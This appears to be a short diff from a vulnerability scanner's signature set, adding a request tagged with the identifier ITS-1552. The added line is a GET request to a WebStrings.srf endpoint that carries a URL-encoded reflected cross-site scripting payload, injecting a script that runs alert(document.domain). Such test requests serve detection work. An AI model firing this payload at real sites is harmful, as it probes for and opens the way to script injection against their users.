@@ -1,0 +1,2 @@
+# Vulnerable: ITS-1552
+GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
